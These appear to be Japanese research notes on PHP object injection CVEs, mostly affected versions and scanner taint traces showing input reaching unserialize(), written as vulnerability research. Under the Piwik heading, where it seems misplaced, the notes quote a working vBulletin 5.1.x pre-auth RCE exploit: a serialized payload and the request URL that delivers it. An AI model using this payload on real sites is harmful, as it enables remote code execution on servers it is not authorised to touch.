# POP

CVE-2015-8562
---

```
Joomla! 1.5.x
Joomla! 2.x
Joomla! 3.4.6 未満の 3.x
```
```
#0  JSessionStorageDatabase->read(t06shu6i2re1j2gjhkcmelebl0)
#1  session_start() called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\joomla\session\session.php:665]
#2  JSession->_start() called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\joomla\session\session.php:603]
#3  JSession->start() called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\cms\application\cms.php:739]
#4  JApplicationCms->loadSession() called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\cms\application\cms.php:131]
#5  JApplicationCms->__construct(, , ) called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\cms\application\site.php:63]
#6  JApplicationSite->__construct() called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\cms\application\cms.php:399]
#7  JApplicationCms::getInstance(site) called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\libraries\joomla\factory.php:125]
#8  JFactory::getApplication(site) called at [C:\Users\askn\git\phpscan\test\resource\main\Joomla_3.4.5-Stable-Full_Package_CVE-2015-8562\index.php:42]
```
```
#0  JSessionStorageDatabase->write(t06shu6i2re1j2gjhkcmelebl0, __default|a:8:{s:15:"session.counter";i:7;s:19:"session.timer.start";i:1458819624;s:18:"session.timer.last";i:1458856777;s:17:"session.timer.now";i:1458856820;s:22:"session.client.browser";s:113:"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36";s:8:"registry";O:24:"Joomla\Registry\Registry":2:{s:7:"*data";O:8:"stdClass":0:{}s:9:"separator";s:1:".";}s:4:"user";O:5:"JUser":26:{s:9:"*isRoot";b:0;s:2:"id";i:0;s:4:"name";N;s:8:"username";N;s:5:"email";N;s:8:"password";N;s:14:"password_clear";s:0:"";s:5:"block";N;s:9:"sendEmail";i:0;s:12:"registerDate";N;s:13:"lastvisitDate";N;s:10:"activation";N;s:6:"params";N;s:6:"groups";a:1:{i:0;s:1:"9";}s:5:"guest";i:1;s:13:"lastResetTime";N;s:10:"resetCount";N;s:12:"requireReset";N;s:10:"*_params";O:24:"Joomla\Registry\Registry":2:{s:7:"*data";O:8:"stdClass":0:{}s:9:"separator";s:1:".";}s:14:"*_authGroups";a:2:{i:0;i:1;i:1;i:9;}s:14:"*_authLevels";a:3:{i:0;i:1;i:1;i:1;i:2;i:5;}s:15:"*_authActions";N;s:12:"*_errorMsg";N;s:13:"*userHelper";O:18:"JUserWrapperHelper":0:{}s:10:"*_errors";a:0:{}s:3:"aid";i:0;}s:16:"com_mailto.links";a:4:{s:40:"75ff2e488628573158a40db554e78fff49cd0359";O:8:"stdClass":2:{s:4:"link";s:60:"http://localhost/POP/joomla/index.php/3-welcome-to-your-blog";s:6:"expiry";i:1458856821;}s:40:"8ed2136e7b9e8d7b3d58166a55f4b8029be95c30";O:8:"stdClass":2:{s:4:"link";s:60:"http://localhost/POP/joomla/index.php/4-about-your-home-page";s:6:"expiry";i:1458856821;}s:40:"127c04ad6faf142bc74e8a9c91d8b5c0cde711fe";O:8:"stdClass":2:{s:4:"link";s:53:"http://localhost/POP/joomla/index.php/6-your-template";s:6:"expiry";i:1458856821;}s:40:"3c7627e791e614f3b15eb7eb187e85a01aa153a5";O:8:"stdClass":2:{s:4:"link";s:52:"http://localhost/POP/joomla/index.php/5-your-modules";s:6:"expiry";i:1458856821;}}})
#1  session_write_close()
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-006456.html)


CVE-2015-7808
---

```
vBulletin 5 Connect 5.1.2 から 5.1.9
vBulletin 5 Connect の vB_Api_Hook::decodeArguments メソッド
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-006017.html)


CVE-2015-7816
---

```
Piwik 2.15.0 未満
Piwik の plugins/Referrers/Controller.php の DisplayTopKeywords 関数
```
```
# Exploit Title: Vbulletin 5.1.X unserialize 0day preauth RCE exploit
# Date: Nov 4th, 2015
# Exploit Author: hhjj
# Vendor Homepage: http://www.vbulletin.com/
# Version: 5.1.x
# Tested on: Debian
# CVE :
# I did not discover this exploit, leaked from the IoT.

# Build the object
php << 'eof'
<?php
class vB_Database {
       public $functions = array();

       public function __construct()
       {
               $this->functions['free_result'] = 'phpinfo';
       }
}

class vB_dB_Result {
       protected $db;
       protected $recordset;

       public function __construct()
       {
               $this->db = new vB_Database();
               $this->recordset = 1;
       }
}

print urlencode(serialize(new vB_dB_Result())) . "\n";
eof
O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bi%3A1%3B%7D

#Then hit decodeArguments with your payload :
http://localhost/vbforum/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2a%00db%22%3BO%3A11%3A%22vB_Database%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7Ds%3A12%3A%22%00%2a%00recordset%22%3Bi%3A1%3B%7D
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-005942.html)


CVE-2015-5687
---

```
Anchor CMS 0.9.x
Anchor CMS の system/session/drivers/cookie.php
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\anchor-cms-0.9\system\cookie.php:48
            return array_key_exists($name, $_COOKIE) ? $_COOKIE[$name] : $fallback;
#2: C:\Users\askn\git\phpscan\test_resource\main\anchor-cms-0.9\system\session\drivers\cookie.php:23
            if($encoded = C::read($cookie . '_payload')) {var_dump($encoded);
#3: C:\Users\askn\git\phpscan\test_resource\main\anchor-cms-0.9\system\session\drivers\cookie.php:25
                if($decoded = base64_decode($encoded)) {
#4: C:\Users\askn\git\phpscan\test_resource\main\anchor-cms-0.9\system\session\drivers\cookie.php:28
                    $serialized = substr($decoded, 32);
#5: C:\Users\askn\git\phpscan\test_resource\main\anchor-cms-0.9\system\session\drivers\cookie.php:31
                        return unserialize($serialized);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-005083.html)


CVE-2015-6828
---

```
SecureMoz Security Audit 1.0.5 およびそれ以前
WordPress 用 SecureMoz Security Audit プラグインの class/__functions.php の tweet_info 関数
中間者攻撃 (man-in-the-middle attack) により、クライアント-サーバデータストリームを変更されることで、PHP オブジェクトインジェクション攻撃を実行
```
```
function tweet_info($url){


	$tweetmeme = unserialize(file_get_contents("http://api.tweetmeme.com/url_info.php?url=$url"));

	return $tweetmeme;

}
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-004725.html)


CVE-2015-2171
---

```
Slim Framework 2.6.0 未満
Slim の Middleware/SessionCookie.php
https://github.com/slimphp/Slim/blob/master/Slim/Middleware/SessionCookie.php#L127
```
```
    protected function loadSession()
    {
        if (session_id() === '') {
            session_start();
        }

        $value = $this->app->getCookie($this->settings['name']);

        if ($value) {
            try {
                $_SESSION = unserialize($value);
            } catch (\Exception $e) {
                $this->app->getLog()->error('Error unserializing session cookie value! ' . $e->getMessage());
            }
        } else {
            $_SESSION = array();
        }
    }
```
[JVN](http://jvndb.jvn.jp/ja/contents/2015/JVNDB-2015-002010.html)


CVE-2014-2027
---

```
EGroupware 1.8.006.20140217 未満
(1) addressbook/csv_import.php の addr_fields パラメータ
(2) addressbook/csv_import.php の trans パラメータ
(3) calendar/csv_import.php の cal_fields パラメータ
(4) calendar/csv_import.php の trans パラメータ
(5) (a) projectmanager/ または (b) infolog/ 配下の csv_import.php の info_fields パラメータ
(6) (a) projectmanager/ または (b) infolog/ 配下の csv_import.php の trans パラメータ
(7) preferences/inc/class.uiaclprefs.inc.php の processed パラメータ
```
```
C:\Users\askn\git\phpscan\test_resource\main\eGroupware-1.8.005.20131007\egroupware\addressbook\csv_import.php:257
            $_POST['addr_fields'] = unserialize(stripslashes($_POST['addr_fields']));
```
[Download](https://sourceforge.net/projects/egroupware/files/OldFiles/eGroupware-1.8.005.20131007/)
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-008008.html)


CVE-2014-9277
---

```
MediaWiki 1.19.22 未満
MediaWiki 1.20.x から 1.22.14 未満の 1.22.x
MediaWiki 1.23.7 未満の 1.23.x
MediaWiki の OutputHandler.php の wfMangleFlashPolicy 関数
第三者により、PHP フォーマットリクエストに <cross-domain-policy> を含む巧妙に細工された文字列を介して、リクエストを <cross-domain-policy> に変換する際に、文字列の長さが変更になることで、PHP オブジェクトインジェクション攻撃を実行
```
[writeup](https://phabricator.wikimedia.org/T73478)
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-007512.html)


CVE-2014-8791
---

```
Tuleap 7.7 未満
Tuleap の project/register.php には、sys_create_project_in_one_step が無効になっている場合
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\tuleap-7.6-4\tuleap-7.6-4\src\common\include\HTTPRequest.class.php:150
                return (get_magic_quotes_gpc() ? $this->_stripslashes($array[$variable]) : $array[$variable]);
#2: C:\Users\askn\git\phpscan\test_resource\main\tuleap-7.6-4\tuleap-7.6-4\src\common\include\HTTPRequest.class.php:152
                return false;
#3: C:\Users\askn\git\phpscan\test_resource\main\tuleap-7.6-4\tuleap-7.6-4\src\common\include\Codendi_Request.class.php:109
            return $this->_get($variable, $this->params);
#4: C:\Users\askn\git\phpscan\test_resource\main\tuleap-7.6-4\tuleap-7.6-4\src\www\project\register.php:39
    $data         = $request->exist('data') ? unserialize($request->get('data')) : array();
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-005725.html)


CVE-2014-8081
---

```
TestLink 1.9.13 未満
TestLink の lib/execute/execSetResults.php
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\testlink-1.9.12\lib\execute\execSetResults.php:1787
          $argsObj->$key = isset($_REQUEST[$sfKey]) ? $_REQUEST[$sfKey] : null;
#2: C:\Users\askn\git\phpscan\test_resource\main\testlink-1.9.12\lib\execute\execSetResults.php:434
          $args->filter_status = unserialize($args->filter_status);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-005175.html)


CVE-2014-5297
---

```
X2Engine 2.8 から 4.1.7
X2Engine の protected/controllers/SiteController.php の actionSendErrorReport メソッド
第三者により、report パラメータの巧妙に細工されたシリアル化データを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\X2CRM-4.1.7\x2engine\protected\controllers\SiteController.php:155
                $errorReport = $_POST['report'];
#2: C:\Users\askn\git\phpscan\test_resource\main\X2CRM-4.1.7\x2engine\protected\controllers\SiteController.php:156
                $errorReport = unserialize(base64_decode($errorReport));
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-004651.html)


CVE-2014-3541
---

```
Moodle 2.3.11 まで
Moodle 2.4.11 未満の 2.4.x
Moodle 2.5.7 未満の 2.5.x
Moodle 2.6.4 未満の 2.6.x
Moodle 2.7.1 未満の 2.7.x
Moodle のリポジトリコンポーネント
第三者により、アドオンに関連付けられたシリアル化データを介して
```
```
https://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-45616

repository/lib.php		diff | blob | blame | history
repository/upgrade.txt		diff | blob | blame | history

repository/coursefiles/lib.php		diff | blob | blame | history
repository/equella/callback.php		diff | blob | blame | history
repository/equella/lib.php		diff | blob | blame | history
repository/lib.php		diff | blob | blame | history
repository/local/lib.php		diff | blob | blame | history
repository/recent/lib.php		diff | blob | blame | history
repository/user/lib.php		diff | blob | blame | history

repository/filepicker.php		diff | blob | blame | history
repository/lib.php		diff | blob | blame | history
repository/repository_ajax.php		diff | blob | blame | history
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-003610.html)


CVE-2014-3942
---

```
TYPO3 4.5.0 以上 4.5.34 未満
TYPO3 4.7.0 以上 4.7.19 未満
TYPO3 6.0.0 以上 6.0.14 未満
TYPO3 6.1.0 以上 6.1.9 未満
TYPO3 の Color Picker Wizard コンポーネント
リモート認証された編集者により、シリアライズされた PHP オブジェクトを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.8\typo3_src-6.1.8\typo3\sysext\core\Classes\Utility\GeneralUtility.php:105
            $value = isset($_POST[$var]) ? $_POST[$var] : $_GET[$var];
#2: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.8\typo3_src-6.1.8\typo3\sysext\core\Classes\Utility\GeneralUtility.php:113
            return $value;
#3: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.8\typo3_src-6.1.8\typo3\sysext\backend\Classes\Controller\Wizard\ColorpickerController.php:127
            $this->fieldChangeFunc = \TYPO3\CMS\Core\Utility\GeneralUtility::_GP('fieldChangeFunc');
#4: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.8\typo3_src-6.1.8\typo3\sysext\backend\Classes\Controller\Wizard\ColorpickerController.php:143
            $fieldChangeFuncArr = unserialize($this->fieldChangeFunc);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-002729.html)


CVE-2014-1613
---

```
Dotclear 2.6.2 未満
第三者により、パスワード保護されたページの dc_passwd Cookie のシリアライズされたオブジェクトを介して、(1) inc/public/lib.urlhandlers.php または (2) plugins/pages/_public.php によって適切に処理されないため
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\dotclear-dotclear-185f7650c1d8\inc\public\lib.urlhandlers.php:370
                            $pwd_cookie = unserialize($_COOKIE['dc_passwd']);
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\dotclear-dotclear-185f7650c1d8\plugins\pages\_public.php:71
                            $pwd_cookie = unserialize($_COOKIE['dc_passwd']);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-002729.html)


CVE-2014-2921
---

```
pimcore 1.4.9 から 2.0.0
pimcore の Pimcore_Tool_Newsletter モジュール内の Newsletter.php の getObjectByToken 関数
第三者により、末尾に \0 文字を持つ Zend_Pdf_ElementFactory_Proxy オブジェクトおよびパス名に関する問題によって
```
```
モジュールが手に入らない。
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-002200.html)


CVE-2014-1691
---

```
Horde Application Framework 5.1.1 未満
Horde Application Framework の Util ライブラリの framework/Util/lib/Horde/Variables.php スクリプト
第三者により、_formvars フォームの巧妙に細工されたシリアライズされたオブジェクトを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\horde-horde-5.0.0\framework\Util\lib\Horde\Variables.php:66
                $this->_expected = @unserialize($vars['_formvars']);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-001890.html)


CVE-2013-1397
---

```
Symfony 2.0.22 未満の 2.0.x
Symfony 2.1.7 未満の 2.1.x
Symfony 2.2.x
第三者により、(1) Yaml::parse 関数または (2) Yaml\Parser::parse 関数へのシリアライズされた PHP オブジェクトを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Yaml.php:96
        public static function parse($input, $exceptionOnInvalidType = false, $objectSupport = false)
#2: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:49
        public function parse($value, $exceptionOnInvalidType = false, $objectSupport = false)
#3: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:557
        private function cleanup($value)
#4: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:559
            $value = str_replace(array("\r\n", "\r"), "\n", $value);
#5: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:563
            $value = preg_replace('#^\%YAML[: ][\d\.]+.*\n#su', '', $value, -1, $count);
#6: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:585
            return $value;
#7: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:53
            $this->lines = explode("\n", $this->cleanup($value));
#8: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Parser.php:82
                if (preg_match('#^\-((?P<leadspaces>\s+)(?P<value>.+?))?\s*$#u', $this->currentLine, $values)) {
#9: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Inline.php:193
        public static function parseScalar($scalar, $delimiters = null, $stringDelimiters = array('"', "'"), &$i = 0, $evaluate = true)
#10: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Inline.php:208
                    $output = substr($scalar, $i);
#11: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Inline.php:390
        private static function evaluateScalar($scalar)
#12: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Inline.php:392
            $scalar = trim($scalar);
#13: C:\Users\askn\git\phpscan\test_resource\main\symfony-2.2.0\src\Symfony\Component\Yaml\Inline.php:406
                        return unserialize(substr($scalar, 13));
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-006548.html)


CVE-2013-2225
---

```
GLPI 0.83.9 およびそれ以前
GLPI の inc/ticket.class.php
第三者により、front/ticket.form.php の _predefined_fields パラメータを介して
```
```
#3: C:\Users\askn\git\phpscan\test_resource\main\glpi-0.83.8\glpi\inc\ticket.class.php:3538
             $values['_predefined_fields']
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-006531.html)


CVE-2013-7034
---

```
LiveZilla 5.1.2.1 未満
LiveZilla の _lib/functions.global.inc.php の setCookieValue 関数
第三者により、Cookie のシリアル化された PHP オブジェクトを介して
```
```
モジュールが手に入らない。
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-006396.html)


CVE-2013-7075
---

```
TYPO3 4.5.0 から 4.5.31
TYPO3 4.7.0 から 4.7.16
TYPO3 6.0.0 から 6.0.11
TYPO3 6.1.0 から 6.1.6
TYPO3 の Content Editing Wizards コンポーネントには、"署名なし (missing signature)" に関する処理に不備があるため
リモート認証されたバックエンドユーザにより、不特定のパラメータを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.6\typo3_src-6.1.6\typo3\sysext\core\Classes\Utility\GeneralUtility.php:91
            $value = isset($_POST[$var]) ? $_POST[$var] : $_GET[$var];
#2: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.6\typo3_src-6.1.6\typo3\sysext\core\Classes\Utility\GeneralUtility.php:99
            return $value;
#3: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.6\typo3_src-6.1.6\typo3\sysext\backend\Classes\Controller\Wizard\ColorpickerController.php:127
            $this->fieldChangeFunc = \TYPO3\CMS\Core\Utility\GeneralUtility::_GP('fieldChangeFunc');
#4: C:\Users\askn\git\phpscan\test_resource\main\typo3_src-6.1.6\typo3_src-6.1.6\typo3\sysext\backend\Classes\Controller\Wizard\ColorpickerController.php:143
            $fieldChangeFuncArr = unserialize($this->fieldChangeFunc);
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-005704.html)


CVE-2013-5674
---

```
Moodle 2.5.2 未満の 2.5.x
Moodle の badges/external.php は、外部バッジ (external badge) の記述をアンシリアライズすることで取得したオブジェクトを適切に処理しない
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:532
            $param = $_POST[$parname];
#2: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:769
    function clean_param($param, $type) {
#3: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:1187
    function fix_utf8($value) {
#4: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:1195
                return $value;
#5: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:1247
            return $value;
#6: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:840
                $param = fix_utf8($param);
#7: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:841
                return strip_tags($param);
#8: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:1175
                print_error("unknownparamtype", '', '', $type);
#9: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\lib\moodlelib.php:552
        return clean_param($param, $type);
#10: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\badges\external.php:31
    $json = required_param('badge', PARAM_RAW);
#11: C:\Users\askn\git\phpscan\test_resource\main\moodle-2.5.1\moodle\badges\external.php:37
    $badge = new external_badge(unserialize($json));
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-004159.html)


CVE-2013-3242
---

```
Joomla! 2.5.10 未満の 2.5.x
Joomla! 3.0.4 未満の 3.0.x
Joomla! の plugins/system/remember/remember.php は、Cookie をアンシリアライズされることで取得されたオブジェクトを適切に処理しない
リモート認証されたユーザにより
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-002577.html)


CVE-2013-1465
---

```
CubeCart 5.0.0 から 5.2.0
CubeCart の classes/cubecart.class.php 内の Cubecart::_basket メソッド
第三者により、巧妙に細工された shipping パラメータを介して
```
```
#1: C:\Users\askn\git\phpscan\test_resource\main\CubeCart-5.2.0\modules\gateway\OptimalPayments\gateway.class.php:187
            $decodedMessage = base64_decode($_POST['encodedMessage']);
#2: C:\Users\askn\git\phpscan\test_resource\main\CubeCart-5.2.0\modules\gateway\CardSave_Redirect\gateway.class.php:493
                        $szHashDigest = $_POST["HashDigest"];
#3: C:\Users\askn\git\phpscan\test_resource\main\CubeCart-5.2.0\includes\functions.inc.php:856
    function base64url_decode($data) {
#4: C:\Users\askn\git\phpscan\test_resource\main\CubeCart-5.2.0\includes\functions.inc.php:861
      return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
#5: C:\Users\askn\git\phpscan\test_resource\main\CubeCart-5.2.0\classes\cubecart.class.php:523
                $GLOBALS['cart']->set('shipping', unserialize(base64url_decode($_POST['shipping'])));
```
[JVN](http://jvndb.jvn.jp/ja/contents/2013/JVNDB-2013-001468.html)


CVE-2012-0911
---

```
TikiWiki 6.7 LTS 未満
TikiWiki 8.4 未満
(1) lib/banners/bannerlib.php の cookieName
(2) tiki-print_multi_pages.php または tiki-print_pages.php の printpages パラメータ
(3) tiki-print_multi_pages.php または tiki-print_pages.php の printstructures パラメータ
(4) tiki-send_objects.php の sendpages パラメータ
(5) tiki-send_objects.php の sendstructures パラメータ
(6) tiki-send_objects.php の sendarticles パラメータ
```
[JVN](http://jvndb.jvn.jp/ja/contents/2012/JVNDB-2012-003065.html)


CVE-2014-5203
---

```
WordPress 3.9.2 未満の 3.9.x
WordPress のウイジェットの実装の wp-includes/class-wp-customize-widgets.php
第三者により、巧妙に細工されたシリアル化されたデータを介して
```
```
#1: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-wp-customize-widgets.php:113
            return wp_unslash( $_POST[$name] );
#2: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\formatting.php:3806
        return stripslashes_deep( $value );
#3: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\formatting.php:1580
        return $value;
#4: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\formatting.php:3806
        return stripslashes_deep( $value );
#5: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-wp-customize-widgets.php:113
            return wp_unslash( $_POST[$name] );
#6: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-wp-customize-widgets.php:1247
                $sanitized_widget_setting = json_decode( $this->get_post_value( 'sanitized_widget_setting' ), true );
#7: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\compat.php:86
            $res = $wp_json->decode( $string );
#8: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:585
            $str = $this->reduce_string($str);
#9: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:554
            $str = preg_replace(array(
#10: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:568
            return trim($str);
#11: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:585
            $str = $this->reduce_string($str);
#12: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:615
                        $chrs = $this->substr8($str, 1, -1);
#13: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:904
            return substr( $string, $start, $length );
#14: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:615
                        $chrs = $this->substr8($str, 1, -1);
#15: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:685
                                    $utf8 .= $this->substr8($chrs, $c, 4);
#16: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:904
            return substr( $string, $start, $length );
#17: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:685
                                    $utf8 .= $this->substr8($chrs, $c, 4);
#18: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:707
                        return $utf8;
#19: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-json.php:853
                            return $obj;
#20: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\compat.php:86
            $res = $wp_json->decode( $string );
#21: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\compat.php:88
                $res = _json_decode_object_helper( $res );
#22: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\compat.php:93
                $data = get_object_vars($data);
#23: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-wp-customize-widgets.php:1164
            $decoded = base64_decode( $value['encoded_serialized_instance'], true );
#24: C:\xampp\htdocs\main\WordPress-3.9.1\wp-includes\class-wp-customize-widgets.php:1170
            $instance = unserialize( $decoded );
```
[JVN](http://jvndb.jvn.jp/ja/contents/2014/JVNDB-2014-003845.html)






